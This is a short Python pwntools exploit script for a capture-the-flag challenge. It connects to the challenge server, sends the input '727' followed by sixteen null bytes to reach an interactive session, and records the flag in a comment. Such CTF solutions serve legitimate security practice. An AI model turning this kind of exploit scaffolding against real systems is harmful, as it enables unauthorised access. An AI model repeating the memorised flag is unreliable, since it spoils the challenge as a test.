#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./challenge_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc chal.osugaming.lol 7279"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = b"727"

    r.sendline(payload)

    payload = b"\x00"*16

    r.sendline(payload)

    r.interactive()
    # osu{i_cant_believe_i_saw_it}

if __name__ == "__main__":
    main()